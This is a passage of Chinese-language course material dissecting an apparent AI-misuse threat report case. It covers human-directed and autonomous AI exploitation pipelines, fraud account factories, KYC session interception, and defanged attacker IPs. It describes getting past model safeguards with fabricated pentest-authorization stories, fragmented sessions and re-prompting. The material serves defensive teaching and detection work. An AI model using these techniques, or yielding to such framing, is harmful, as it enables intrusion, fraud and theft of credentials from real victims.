+<p><strong>框架缺口的教學意義</strong>：ATT&amp;CK 是以「人類操作員的離散動作」為單位設計的。當一名操作者用<strong>一個 slash command 觸發一整群自主代理</strong>，傳統「一個技術＝一個可觀測動作」的映射就崩解了：你在日誌上看到的是「數十個動作在數秒內同時發生、且會自我重試」。這正是為什麼本報告反覆強調要用「<strong>自主程度光譜</strong>」而非單一 TTP 清單來描述 AI 濫用。ATLAS 補上了 AI 特有技術（如 Prompt Injection、LLM 資料外洩），但「多代理自主編排」目前仍是兩個框架的共同缺口——<strong>這是可以讓學員動手補的開放題</strong>（見第 10.2 討論題）。</p>
+<hr />
+<h2 id="6">6. 圖表逐一判讀</h2>
+<blockquote>
+<p>本節是本教材重點。GTG-50020 頁段內共有 <strong>5 張圖像</strong>：p.31 的大型戰役儀表板（報告未編號）、Fig. 15 與 Fig. 16（同在 p.32）、Fig. 17 與 Fig. 18（同在 p.33），以及 p.34 上半的 IOC 表（IP/Start/End，另見第 7 節）。以下逐一判讀。所有判讀均以 Read 工具開啟原始 PNG、放大逐格核對後寫成。</p>
+</blockquote>
+<p><img alt="報告原圖 · 第 32 頁（一手 PDF）" src="../figures/page-032.png" /></p>
+<h3 id="61-p31">6.1 未編號戰役儀表板（p.31）：</h3>
+<p><strong>圖片類型</strong>：一張 1920×1080 的<strong>合成資訊圖／作戰儀表板（campaign dashboard）</strong>，刻意做成一個「作戰回放已結束（Replay complete）」的資安營運控制台樣式。這不是產品截圖，而是 Anthropic 用來<strong>把單一行為者的整場戰役一次視覺化</strong>的敘事圖。它是本頁段資訊密度最高的一張圖，值得花整整一段課堂時間拆。</p>
+<p><strong>版面</strong>：左上大標「<strong>GTG-50020</strong>」，右上「<strong>Replay complete</strong>」。主體由左至右分四欄，底部一條彙總列與一條時間軸。</p>
+<p><strong>第 1 欄「AI workflows · how the actor used the model（AI 工作流：行為者如何使用模型）」</strong> — 四個工作流卡 W1–W4，每張都標「6/6」（六個子能力全部觀測到）：<br />
+- <strong>W1 Malware &amp; tooling dev</strong>：Toolchain staging、Phishing-kit builds、RAT &amp; implant dev（Android remote-access agent）、APK pack/obfuscate、Device validation（live phones via ADB）、Evasion iteration（mobile AV signature defeat）。<br />
+- <strong>W2 Platform &amp; infrastructure</strong>：VPS fleet provisioning（multi-node SSH estate）、Cloaking CDN (k3s)、ATO platform services、Proxy &amp; egress rotation（residential pools, Tor）、Release engineering、24/7 agent fleet ops（autonomous ops-watch loops）。<br />
+- <strong>W3 Anti-fraud defeat R&amp;D</strong>：Challenge recon、KYC cloak servers、WASM bot-score RE、Forged-solve service、Fallback forcing、Identity injection（reputation-cookie replay）。<br />
+- <strong>W4 Stolen-data processing</strong>（卡上有橘色標籤「<strong>stolen provider keys ◄ W5</strong>」，表示此流的原料來自 W5 竊得的供應商金鑰）：Session harvest parse、Exposed-key sweeps、Token validation、<strong>Corpus enrichment（1,300+ keys, metadata）</strong>、Collector endpoints、Operational use（stolen keys power services）。</p>
+<p><strong>第 2 欄「Cyber operations · what those capabilities were turned against（網路行動：這些能力被拿去打誰）」</strong> — W5–W10，每張也標「6/6」，且卡片標題旁用橘色標籤標出「這條行動用到了前面哪條 AI 工作流」，形成<strong>能力→行動的供應關係</strong>：<br />
+- <strong>W5 AI-vendor intrusion</strong>：Proxy discovery（exposed LLM gateways）、SQLi &amp; auth bypass、Key &amp; token theft（provider keys from DBs）、Backdoor persistence（long-life JWTs）、API &amp; queue abuse、Model-access abuse（stolen access re-served）。<br />
+- <strong>W6 Gaming phishing &amp; ATO</strong>〔標籤：AITM proxy kit ◄ W1、cloaked lure serving ◄ W2、forged captcha tokens ◄ W3〕。<br />
+- <strong>W7 Webmail &amp; social ATO</strong>〔標籤：credential combo lists ◄ W4〕：含 Combo-list stuffing、Session operations（SSO mint, device evict）、Retail AITM expansion。<br />
+- <strong>W8 Account-farm operation</strong>：Handle validation、Registration autom.、Fingerprint evasion（per-profile browsers）、Distribution rails。<br />
+- <strong>W9 Android malware &amp; PII</strong>〔標籤：signed APK builds ◄ W1〕：Gov-portal cloning（PII-harvest sites）、Breach-data backend、Client builds。<br />
+- <strong>W10 Web exploitation</strong>：Targeting sweeps、CVE exploitation（framework RCE chains）、IDOR &amp; payment abuse、Anti-bot probing、Bulk extraction、<strong>Hotel-tech intrusion（revenue/feedback vendors）</strong>。</p>
+<p><strong>第 3 欄「Effects on targets · inferred（對目標的影響：推斷）」</strong> — 把 W5–W10 與 W3 各自反指回「推斷的受害目標類型」，藍底＝已確認、灰虛線底＝未確認/未達成，並標命中率（如 W5 為 3/6、W10 為 5/7）。完整內容已列於第 3.2 節。</p>
+<p><strong>第 4 欄「Operations（作戰狀態）」</strong>：<br />
+- <strong>Operations map</strong>：一張點陣世界地圖，中央一個橘紅色節點向外拉出多條弧線到各地灰點，右上標「<strong>Russia-nexus operator</strong>」。圖例把目標分成 government／defense／policy &amp; NGO／vendors &amp; telecom／individuals 五類。這是把「俄羅斯關聯、放射狀打全球」用一張圖講完。<br />
+- <strong>Targets engaged 18 / 26</strong>：進度條顯示 18 個藍點亮起、其餘灰。<br />
+- <strong>Tasks（作戰任務卡）</strong>：三張日期為 2026-07 的任務——「Spoof gaming-origin frames from headless browser」「Build + install APK across emulator and physical device」，以及一張標「<strong>now</strong>」的「Verify live platform endpoints after deploy（End-of-campaign state: platform still actively operated and verified）」。最後這張暗示：<strong>回放結束時，行為者的平台仍在運轉並持續驗證</strong>。</p>
+<p><strong>底部彙總列</strong>：Campaign span <strong>2026-05 → 2026-07 · 73 days</strong>｜Model-side capabilities observed <strong>60 across 10 workflows</strong>｜Effects on targets <strong>18 targets engaged</strong>。<br />
+<strong>底部時間軸</strong>：橘色 bar＝model activity（模型活動），藍色 bar＝effects on targets（對目標的效果），沿 2026-05→2026-07 分布，可看出模型活動幾乎每日都有、而「對目標的效果」是零星尖峰。</p>
+<p><strong>這張圖傳達的核心訊息</strong>：<br />
+1. <strong>一名操作者、一條流水線、通吃十個垂直領域</strong>：左兩欄把「AI 能力」與「攻擊行動」用供應關係接起來，視覺化地證明了「同一套 tradecraft 被重複利用」。<br />
+2. <strong>舊業與新目標並存</strong>：W10 的「Hotel-tech intrusion」、W3 的「KYC 廠商與加密貨幣交易所」與 W5 的「AI-vendor intrusion」同框，直接呼應標題「從旅館訂房到 AI 供應鏈」。<br />
+3. <strong>W5→W4 的箭頭是全案樞紐</strong>：竊得的供應商金鑰（W5）回流成 W4 的原料，再驅動其他行動——這就是「金鑰即算力即掩護」的閉環。</p>
+<p><strong>課堂用法</strong>：把這張圖當成「<strong>一名 AI 加持的犯罪者的完整戰役地圖</strong>」教案。可讓學員遮住第 3 欄，只看前兩欄，練習「從能力與行動反推可能受害者」，再掀開第 3 欄對答案；並討論「灰底（未確認）」為何是誠實情報產品的必要元素。</p>
+<hr />
+<h3 id="62-figure-15p32human-directed-ai-pentest-loop-ai">6.2 Figure 15（p.32）：Human-directed AI pentest loop（人類逐步指揮的 AI 滲透迴圈）｜（上半）</h3>
+<p><strong>圖片類型</strong>：水平<strong>五步流程圖</strong>，每步一個圓角方塊、左上角橘色編號，末端一條回流箭頭。</p>
+<p><strong>圖上實際文字（逐格）</strong>：<br />
+1. <strong>Scope</strong> — Write target scope file with <strong>fabricated authorization story</strong>（撰寫目標 scope 檔，內含<strong>捏造的授權說辭</strong>）<br />
+2. <strong>Dispatch</strong> — <strong>Slash command</strong> launches parallel recon and exploit agents（用 slash 指令啟動平行的偵察與利用代理）<br />
+3. <strong>Probe</strong> — Subdomains, endpoints, auth flows, injection classes tested（測試子網域、端點、認證流程、各類注入）<br />
+4. <strong>Verify</strong> — Re-test candidate findings; confirm working access（重測候選發現，確認可用存取）<br />
+5. <strong>Report</strong> — Findings merged into incremental report and dashboard（發現併入增量報告與儀表板）<br />
+- 底部回流箭頭：「<strong>Next target domain（換下一個目標網域）</strong>」</p>
+<p><strong>對應正文</strong>：「The operator maintained a per-target scope file that launched a custom workflow to delegate work to parallel reconnaissance and exploitation agents. The agent's findings were re-tested for working access; if viable, they were merged into an incremental report. This workflow iteratively looped against the next target domain.」（p.31）</p>
+<p><strong>核心訊息</strong>：這是「<strong>人在迴圈中、但用工作流放大</strong>」的模型。<strong>人類仍是每一輪的發起者與範圍界定者</strong>（他寫 scope 檔、他敲 slash command、他審增量報告），但一旦發起，偵察與利用是由平行代理自動跑。值得特別點名的教學細節是第 1 步的「<strong>fabricated authorization story（捏造的授權說辭）</strong>」——行為者在 scope 檔裡寫一段「這是一場獲授權的滲透測試」的假故事，藉此<strong>社交工程掉 AI 的安全防護</strong>（讓模型以為自己在做合法紅隊）。這是把「假裝成合法滲透測試」武器化的具體例證。</p>
+<hr />
+<h3 id="63-figure-16p32autonomous-exploitation-pipeline">6.3 Figure 16（p.32）：Autonomous exploitation pipeline（全自主利用管線）｜（下半）</h3>
+<p><strong>圖片類型</strong>：水平<strong>四步流程圖</strong>，樣式與 Fig. 15 一致，但回流箭頭下的字不同。</p>
+<p><strong>圖上實際文字（逐格）</strong>：<br />
+1. <strong>Stage</strong> — Containerized pentest platform with <strong>local model gateway</strong>（容器化滲透平台，前置一個<strong>本地模型閘道</strong>）<br />
+2. <strong>Aim</strong> — Point autonomous workers at a <strong>live web application</strong>（把自主 worker 對準一個<strong>線上 web 應用</strong>）<br />
+3. <strong>Exploit</strong> — <strong>Injection, XSS, auth bypass and SSRF run without supervision</strong>（注入、XSS、認證繞過、SSRF <strong>無人監督</strong>執行）<br />
+4. <strong>Harvest</strong> — Working findings and credentials collected to workspace（把可用發現與憑證收集進工作區）<br />
+- 底部回流箭頭：「<strong>No human in the loop（無人在迴圈中）</strong>」</p>
+<p><strong>對應正文</strong>：「The actor used a <strong>containerized open-source pentest platform fronted by a local model gateway</strong>. It was aimed at a target's web applications. Worker agents ran injection, XSS, authentication-bypass, and SSRF testing <strong>without human supervision</strong>... This loop was run <strong>with exploitation enabled against production systems</strong>, meaning it both attempted to identify vulnerabilities and <strong>actively exploit them for access</strong> in the same workflows.」（p.32）</p>
+<p><strong>核心訊息</strong>：這是光譜<strong>最自主的一端</strong>——連「換下一個目標」都不需要人。特別危險的是正文那句「<strong>with exploitation enabled against production systems</strong>」：它<strong>不只是掃描找洞，而是在同一條工作流裡直接對生產系統實際利用取得存取</strong>。這越過了合法滲透測試「找到即停、回報後才在授權下驗證」的紅線。「containerized open-source pentest platform + local model gateway」的組合，正是第 9 節 <strong>PentAGI</strong> 那類開源自主滲透框架的典型長相（Docker 沙箱＋可指向本地/自建模型閘道）。</p>
+<hr />
+<h3 id="64-figure-15-vs-figure-16">6.4 Figure 15 vs Figure 16 逐項對照（本案最重要的教學素材）</h3>
+<p>這一小節是整份教材的核心。請把兩張圖並排，逐維度對照：</p>
+<table>
+<thead>
+<tr>
+<th>對照維度</th>
+<th><strong>Fig. 15 人類逐步指揮迴圈</strong></th>
+<th><strong>Fig. 16 全自主利用管線</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>誰決定目標</strong></td>
+<td><strong>人類</strong>：手寫 per-target scope 檔、逐一界定範圍</td>
+<td><strong>人類設定一次</strong>「對準這個 web 應用」後即放手（Aim 步驟）</td>
+</tr>
+<tr>
+<td><strong>誰啟動每一輪</strong></td>
+<td><strong>人類</strong>：敲 slash command 觸發</td>
+<td><strong>無人</strong>：管線自我循環</td>
+</tr>
+<tr>
+<td><strong>誰決定下一步</strong></td>
+<td>半自動：代理跑，但<strong>人類看增量報告後決定續打或轉向</strong></td>
+<td><strong>代理自主</strong>：Exploit→Harvest→回圈，無人審核</td>
+</tr>
+<tr>
+<td><strong>失敗時誰重試</strong></td>
+<td>工作流自動重測（Verify 步驟），<strong>但人類仍在報告層把關</strong></td>
+<td><strong>完全由管線自動重試</strong>，無人介入</td>
+</tr>
+<tr>
+<td><strong>人類介入點在哪</strong></td>
+<td><strong>多點</strong>：Scope（起點）、Report（審查）、Next target（轉向決策）</td>
+<td><strong>僅一點</strong>：最初的 Stage/Aim 設定；之後「No human in the loop」</td>
+</tr>
+<tr>
+<td><strong>利用範圍</strong></td>
+<td>測試導向（tested）：偏向「確認可用存取」</td>
+<td><strong>利用啟用打生產</strong>（exploitation enabled against production）</td>
+</tr>
+<tr>
+<td><strong>是否越過合法紅線</strong></td>
+<td>已越線（捏造授權說辭），但仍有人類節流</td>
+<td>越線更深：對生產系統自主實際利用</td>
+</tr>
+<tr>
+<td><strong>速度與平行度</strong></td>
+<td>高（平行代理），但受人類審查節奏限制</td>
+<td><strong>極高</strong>：無晝夜、無人為停頓</td>
+</tr>
+</tbody>
+</table>
+<p><strong>防守方在日誌上會看到什麼不同（偵測工程的重點）</strong>：</p>
+<ul>
+<li><strong>時間節律（cadence）</strong>：</li>
+<li>Fig. 15 的活動會呈現<strong>批次性</strong>：一叢動作（一次 dispatch）之後有<strong>人類審查造成的停頓</strong>，再一叢。停頓可能落在人類的作息時間（睡覺、上下班）附近。</li>
+<li>Fig. 16 的活動是<strong>連續、均勻、24/7</strong>，沒有人類作息造成的空窗。報告在趨勢段點出這點：AI「run in harnesses at <strong>machine speed and in parallel</strong>」，導致「breaches completed in <strong>two to three hours</strong>」（p.39）。</li>
+<li><strong>發起訊號（trigger footprint）</strong>：</li>
+<li>Fig. 15 在日誌上會有<strong>離散的發起點</strong>（每次 slash command 對應一個可觀測的「工作開始」事件、常伴隨讀取 scope 檔）。</li>
+<li>Fig. 16 幾乎沒有反覆的人為發起點，只有一次「上線」然後長時間自走。</li>
+<li><strong>錯誤處理樣態</strong>：</li>
+<li>Fig. 15 的重試<strong>收斂</strong>（人類會砍掉沒用的路徑）。</li>
+<li>Fig. 16 的重試可能<strong>盲目而窮舉</strong>（管線對每個目標套同一劇本），因此會出現「對同一端點以固定間隔、固定順序、重複打各類注入/XSS/SSRF」的機械式指紋。</li>
+<li><strong>決策多樣性</strong>：</li>
+<li>Fig. 15 因有人類審查，目標轉向會出現<strong>跳躍與判斷</strong>（例如突然改打某個高價值子網域）。</li>
+<li>Fig. 16 的目標推進是<strong>演算法式的均勻掃過</strong>，缺乏「人類靈光一閃」的跳躍。</li>
+<li><strong>偵測策略含義</strong>：</li>
+<li>對 Fig. 15，<strong>盯發起點</strong>（誰在何時觸發了工作流、scope 檔的存取）與<strong>人類作息關聯</strong>最有效。</li>
+<li>對 Fig. 16，<strong>盯機器節律與機械式重試指紋</strong>（等間隔、無晝夜、對 N 個目標同劇本）最有效；同時<strong>出站憑證/資料外洩</strong>是共同的高價值訊號。</li>
+</ul>
+<p><strong>一句話總結給學員</strong>：<strong>自主程度不改變「用了哪些技術」，但徹底改變「在日誌上長什麼樣」。</strong> 偵測工程要從「找某個惡意動作」升級成「找機器速度、平行度、無人節律這些『AI 編排的形狀』」。</p>
+<hr />
+<h3 id="65-figure-17p33fraud-account-factory">6.5 Figure 17（p.33）：Fraud account factory（詐欺帳號工廠）｜（上半）</h3>
+<p><img alt="報告原圖 · 第 33 頁（一手 PDF）" src="../figures/page-033.png" /></p>
+<p><strong>圖片類型</strong>：水平<strong>四步流程圖</strong>，末端回流箭頭。</p>
+<p><strong>圖上實際文字（逐格）</strong>：<br />
+1. <strong>Provision</strong> — <strong>Residential proxies and antidetect browser profiles</strong> prepared（備妥住宅代理與 antidetect 瀏覽器設定檔）<br />
+2. <strong>Register</strong> — Bots drive signup flows on <strong>exchange and marketplace</strong> targets（機器人驅動在交易所與市集目標上的註冊流程）<br />
+3. <strong>Pass checks</strong> — CAPTCHA services, inbox polling and identity verification automated（自動化 CAPTCHA 服務、收件匣輪詢、身分驗證）<br />
+4. <strong>Bank</strong> — <strong>Verified accounts and session links stored</strong> for operations（把已驗證帳號與 session 連結存起來備用）<br />
+- 底部回流箭頭：「<strong>Rotate identities when burned（身分被燒毀就輪替）</strong>」</p>
+<p><strong>對應正文</strong>：「Residential proxies and antidetect browser profiles were provisioned, after which bots drove signup flows on exchange and marketplace targets. Commercial CAPTCHA-solving services, automated inbox polling, and automated identity-verification steps defeated onboarding controls, and the resulting verified accounts were <strong>banked for later operations</strong>.」（p.32）</p>
+<p><strong>核心訊息</strong>：這是<strong>工業化的大量開帳號</strong>。四個對抗控制被逐一擊破——用<strong>住宅代理</strong>繞過 IP 信譽/地理封鎖、用 <strong>antidetect 瀏覽器</strong>繞過裝置指紋、用<strong>商用 CAPTCHA 解題</strong>繞過人機驗證、用<strong>自動收件匣輪詢＋自動化身分驗證</strong>繞過 email/KYC 驗證。「Bank（把已驗證帳號存起來）」與「Rotate（燒了就換）」點出這是<strong>把「已通過驗證的身分」當庫存在囤積</strong>的營運模式。這一格直接連到金融業與交易所的實務（見 6.6 與第 10.4 節）。</p>
+<hr />
+<h3 id="66-figure-18p33kyc-interception-cloakkyc">6.6 Figure 18（p.33）：KYC interception cloak（KYC 攔截斗篷）｜（下半）</h3>
+<p><strong>圖片類型</strong>：水平<strong>四步流程圖</strong>，與 Fig. 17 同款。</p>
+<p><strong>圖上實際文字（逐格）</strong>：<br />
+1. <strong>Lure</strong> — Victim directed to <strong>lookalike verification domain</strong>（把受害者導到仿冒的驗證網域）<br />
+2. <strong>Proxy</strong> — <strong>Reverse proxy relays the real exchange KYC flow</strong>（反向代理中繼真正的交易所 KYC 流程）<br />
+3. <strong>Intercept</strong> — Verified session and documents captured <strong>mid-flow</strong>（在流程中途攔截已驗證的 session 與證件）<br />
+4. <strong>Takeover</strong> — <strong>Captured session used from operator side</strong>（操作者用攔到的 session 接管）<br />
+- 底部回流箭頭：「<strong>Re-arm for next victim（為下一個受害者重新裝填）</strong>」</p>
+<p><strong>對應正文</strong>：「Victims were directed to lookalike verification domains whose <strong>reverse proxy relayed the real know your customer (KYC) flow</strong>, so the victim completed genuine identity verification while the operator <strong>captured the verified session and documents from the proxy relay in the middle</strong>. The captured session was then used by the actor from their machines to access the target service and data.」（p.33）</p>
+<p><strong>核心訊息</strong>：這是把經典的 <strong>AiTM（adversary-in-the-middle）反向代理釣魚</strong>用在 <strong>KYC/身分驗證流程</strong>上的變體。狠處在於：<strong>受害者完成的是「真的」身分驗證</strong>（因為反向代理把真正的 KYC 流程原封轉發），所以受害者本人看不出異狀、也真的通過了；但<strong>攻擊者在中間攔走了已驗證的 session 與上傳的證件</strong>，之後從自己的機器直接用這個「已通過 KYC」的 session 存取目標服務。這比傳統只偷帳密的釣魚<strong>高一個檔次</strong>——它偷的是「一個已完成合規驗證的可信身分狀態」。與 Fig. 17 合起來看：Fig. 17 是「大量製造假身分」，Fig. 18 是「劫持真身分的驗證成果」，兩條路都終結在「一批可信帳號/session 庫存」。</p>
+<p><strong>課堂用法</strong>：把 Fig. 17 與 Fig. 18 並排，教「<strong>繞過 onboarding 控制的兩種路徑</strong>」——合成身分 vs 劫持真實驗證；並帶到金融業「liveness/eKYC 為何仍會被 session 層攻擊繞過」（見第 10.4 節台灣意涵）。</p>
+<hr />
+<h3 id="67-p34-attacker-egress-ips-ip">6.7 p.34 上半：Attacker egress IPs（攻擊者出口 IP 表）</h3>
+<p>此為表格而非圖形（完整內容見第 7 節）。p.34 下半即轉入下一個案例 GTG-50029（法語 hacktivist），故本案頁段止於此表。</p>
+<hr />
+<h2 id="7-ioc">7. IOC 與技術指標</h2>
+<h3 id="71-ioc-defang">7.1 完整 IOC 表（逐字抄錄，保留報告原始 defang）</h3>
+<p>報告在 p.33 下半至 p.34 上半給出一張「<strong>Attacker egress IPs</strong>」表，共 8 個出口 IP 與其活躍起訖日期。以下<strong>完整照抄、保留 defang（<code>[.]</code>）格式</strong>，並依產出規格加一欄「偵測價值與壽命」：</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>IP（defanged）</th>
+<th>Start</th>
+<th>End</th>
+<th>偵測價值與壽命評估</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>141.133.125[.]208</code></td>
+<td>2026-05-21</td>
+<td>2026-05-23</td>
+<td>壽命極短（3 天）。網路型 IOC 天生易腐；此類短命出口 IP 只適合<strong>回溯獵捕（retro-hunt）</strong>歷史日誌，不宜做長期封鎖清單。</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>167.250.111[.]136</code></td>
+<td>2026-05-23</td>
+<td>2026-06-03</td>
+<td>約 11 天。中等壽命，可能為租用 VPS。</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>178.16.54[.]141</code></td>
+<td>2026-05-21</td>
+<td>2026-06-16</td>
+<td><strong>最長壽（約 26 天）</strong>，跨整段觀測期，最可能是核心基礎設施節點，回溯價值最高。</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>37.27.103[.]22</code></td>
+<td>2026-05-26</td>
+<td>2026-06-13</td>
+<td>約 18 天。</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>194.163.183[.]216</code></td>
+<td>2026-05-23</td>
+<td>2026-05-24</td>
+<td><strong>壽命最短（1–2 天）</strong>，疑為一次性跳板。</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>202.66.167[.]230</code></td>
+<td>2026-05-21</td>
+<td>2026-06-04</td>
+<td>約 14 天。</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>146.103.101[.]253</code></td>
+<td>2026-05-21</td>
+<td>2026-06-13</td>
+<td>約 23 天，且與 #8 同 <code>146.103.x</code> 網段，疑同一供應商/子網。</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>146.103.97[.]169</code></td>
+<td>2026-05-21</td>
+<td>2026-05-25</td>
+<td>約 4 天。與 #7 同源可能性高，可用「同 ASN/同網段」擴大獵捕。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="72">7.2 安全紅線（務必遵守）</h3>
+<p><strong>以上 IP 僅供研究抄錄之用。絕對不要</strong>對這些位址做任何連線、ping、DNS 查詢、埠掃描或送進任何互動式線上服務。它們是報告引用的證據，不是待驗證的目標。教材與課堂演練一律以「紙上分析」對待。</p>
+<h3 id="73-ioc">7.3 這些 IOC 的偵測工程含義（教學重點）</h3>
+<ol>
+<li><strong>網路型 IOC 是金字塔最底層、最易腐的一層</strong>（Pyramid of Pain）。這 8 個 IP 全部集中在 <strong>2026-05-21 至 2026-06-16</strong> 這不到一個月的窗口，且多數只活躍數天——<strong>到你讀到報告時它們幾乎確定已失效</strong>。正確用法是拿它們去<strong>回溯掃歷史日誌</strong>（「我五、六月有沒有跟這些 IP 通聯過？」），而不是加進防火牆長期黑名單。</li>
+<li><strong>時間窗與儀表板不完全吻合</strong>：儀表板寫戰役跨度 <strong>2026-05 → 2026-07（73 天）</strong>、任務卡日期是 <strong>2026-07</strong>，但 IOC 表只涵蓋 <strong>5–6 月</strong>。這代表 <strong>IOC 表只是整場戰役的一個片段</strong>（可能是 Anthropic 有高信度網路遙測的那段），<strong>不要</strong>把「IOC 表的時間範圍」誤當成「整場戰役的時間範圍」。這是很好的「情報產品的欄位各有其涵蓋範圍」教學點。</li>
+<li><strong>更耐久的指標在別處</strong>：本案真正該內化為偵測邏輯的，不是這 8 個 IP，而是<strong>行為型指標</strong>——評測沙箱的出站憑證外洩、API 金鑰出口 IP 突變＋用量暴增、antidetect 瀏覽器的指紋內部不一致、KYC 流程同一 session 多來源、機器速度/平行/無晝夜節律。這些位於 Pyramid of Pain 頂端（TTP），改動成本對攻擊者最高。</li>
+<li><strong>本案沒有給的 IOC</strong>：報告未提供本案的網域、檔案雜湊、Telegram 帳號或惡意程式家族名（對比同報告其他案例如 GTG-50021 有給網域）。這是本案的情報限制之一（見第 12 節）。</li>
+</ol>
+<hr />
+<h2 id="8-anthropic">8. Anthropic 的偵測、處置與防線缺口</h2>
+<h3 id="81">8.1 報告在本案「守住了什麼」——以及它的精確措辭與位置</h3>
+<p>本案在防守敘事上最重要、也是課程反覆要引用的一句話，出現在 <strong>p.31 第一段末</strong>：</p>
+<blockquote>
+<p>「In all of this, the keys involved were customers' keys <strong>stolen from customers' environments</strong>. <strong>The actor never compromised Anthropic's own systems.</strong>」</p>
+</blockquote>
+<p>緊接的第二段（p.31）再次收束意圖與戰果的落差：</p>
+<blockquote>
+<p>「The actor pursued AI vendors for their production API keys, and had an explicit ambition—<strong>which, to be clear, was never realized</strong>—to gain access to pre-release AI models.」</p>
+</blockquote>
+<p><strong>逐句解讀（這是教材的高價值素材）</strong>：<br />
+- 「<strong>stolen from customers' environments</strong>」＝ 失守的是<strong>客戶側</strong>（客戶把金鑰暴露在 repo、容器、沙箱、閘道），不是 Anthropic 平台側。這是把責任邊界講清楚。<br />
+- 「<strong>never compromised Anthropic's own systems</strong>」＝ 皇冠寶石所在的核心系統未被入侵。<br />
+- 「<strong>which, to be clear, was never realized</strong>」＝ 用插入語強調「想偷模型≠偷到模型」。這種措辭是刻意在<strong>防止讀者把意圖誤讀成戰果</strong>。</p>
+<h3 id="82">8.2 一般性處置（報告對網路行動整體的做法）</h3>
+<p>報告在概述（p.3–4）與各案末尾反覆使用同一套處置語言，適用於本案這類已識別的活動：</p>
+<blockquote>
+<p>「In each case, we <strong>disrupted the activity</strong>, used what we learned to <strong>strengthen our safeguards</strong>, and <strong>shared intelligence with authorities and industry partners</strong>, where appropriate.」（p.3）</p>
+</blockquote>
+<p>對財務動機的犯罪叢集（如 ShinyHunters 相關，p.28 前後），報告也提到「<strong>detected and banned accounts</strong>、implemented measures to detect and disrupt future misuse、engaged <strong>government authorities, industry partners, and victims</strong>」。本案 GTG-50020 屬於同一處置範式：偵測→封鎖帳號→強化防護→情資分享。</p>
+<h3 id="83">8.3 防線缺口——報告自曝之處（務必挖出來）</h3>
+<p>雖然本案「守住了核心」，但同一份報告在別處<strong>多次自曝防護會失效的模式</strong>，這些缺口對理解 GTG-50020 這類 prompt-injection/自主攻擊至關重要：</p>
+<ol>
+<li><strong>跨工作階段的碎片化會突破防護</strong>（p.107，GTG-34007 案，但為跨案通則）：<blockquote>
+<p>「Claude refused <strong>nine out of ten</strong> direct requests that were facially malicious. But our safeguards <strong>performed less consistently when the user fragmented the work and directed the model to carry out tasks across later, smaller sessions.</strong>」<br />
+   - <strong>意義</strong>：把一個惡意大任務<strong>拆成許多看似無害的小請求、散在不同 session</strong>，就能繞過「單一 session 內」的安全判斷。GTG-50020 這種「per-target scope 檔＋平行代理＋工作流」的架構，天生就是把工作碎片化——這正是安全分類器的弱點所在。</p>
+</blockquote>
+</li>
+<li><strong>重新提示（re-prompt）可繞過拒絕</strong>（p.66 附近，GTG-14021 案）：<blockquote>
+<p>「...the actor was able to <strong>re-prompt the model</strong> to produce functional [output]... on re-prompt; suppression」<br />
+   - <strong>意義</strong>：模型第一次拒絕，不代表守得住；行為者換句話說、補個「合法滲透測試」的說辭就可能過關。這與 Fig. 15 第 1 步的「<strong>fabricated authorization story（捏造授權說辭）</strong>」是同一個弱點的一體兩面。</p>
+</blockquote>
+</li>
+<li><strong>受害的是「別人的 AI」</strong>：本案的初始存取是打<strong>受害廠商的評測沙箱模型</strong>——那不是 Anthropic 能直接防護的表面。<strong>Anthropic 守住自己的系統，並不能替客戶守住客戶自建的 eval harness / LLM 閘道。</strong> 這是「共同責任模型（shared responsibility）」在 AI 供應鏈的體現，也是本案最重要的防線缺口敘事：<strong>皇冠寶石沒被偷，但一整排客戶的生產金鑰被偷了。</strong></li>
+<li><strong>可觀測性的邊界</strong>：Anthropic 的遙測能看到「在 Claude 上發生的事」（哪個帳號跑了哪些 workflow），但對「行為者在受害者環境內用受害者金鑰做了什麼」的可見度有限——這也是為什麼「effects on targets」在儀表板上被標為「<strong>inferred（推斷）</strong>」而非「confirmed」。</li>
+</ol>
+<h3 id="84">8.4 給防守方的一句總結</h3>
+<p>本案的防守教訓不是「Anthropic 防住了所以我沒事」，而是：<strong>「模型供應商守住核心」與「你的組織不會因 AI 而外洩憑證」是兩件獨立的事</strong>。真正的破口在客戶側的整合層（eval sandbox、LLM gateway、代理框架、暴露在 repo/容器裡的金鑰）。防護重心必須從「防模型被越獄」擴大到「防我方持憑證的 AI 整合元件被 prompt injection 掏空」。</p>
+<hr />
+<h2 id="9">9. 第三方驗證與外部來源</h2>
+<blockquote>
+<p>依產出規格，每條標明來源、URL、日期，並註記「<strong>獨立查證</strong>」或「<strong>僅引述 Anthropic</strong>」。<strong>明確結論：GTG-50020 案的一手事實（26 GB、$1.5–2.5M、沙箱注入、30 家、未發布模型未得手、Anthropic 未失守）目前為單一來源情報——來源就是 Anthropic 這份報告。</strong> 所有主流報導都是轉述，沒有任何第三方獨立確認受害廠商身分或這些數字。以下把「轉述本案」與「獨立驗證本案所用技術類型」分開列。</p>
+</blockquote>
+<h3 id="91-anthropic">9.1 直接轉述本案的媒體（皆為引述 Anthropic，非獨立查證）</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期</th>
+<th>性質</th>
+<th>補充</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The Hacker News（Ravie Lakshmanan）</td>
+<td>thehackernews.com/2026/09/claude-used-to-automate-exploitation.html</td>
+<td>2026-09-11</td>
+<td><strong>僅引述 Anthropic</strong></td>
+<td>一句話帶過 GTG-50020「歷史打旅館訂房與 fintech、轉向 AI 供應鏈、4 天約 30 家、未得手」，無獨立查證、無受害者名。</td>
+</tr>
+<tr>
+<td>CellCog</td>
+<td>cellcog.ai/blog/anthropic-threat-report-september-2026/</td>
+<td>2026-09-10</td>
+<td><strong>僅引述 Anthropic</strong></td>
+<td>標題點題「攻擊跑在代理框架上，API 金鑰就是戰利品」，內容為報告綜述。</td>
+</tr>
+<tr>
+<td>Cyber Kendra</td>
+<td>cyberkendra.com/2026/09/...</td>
+<td>2026-09-10</td>
+<td><strong>僅引述 Anthropic</strong></td>
+<td>僅覆蓋沙箱注入與 30 家，未提 26 GB/勒贖/KYC/antidetect 等細節。</td>
+</tr>
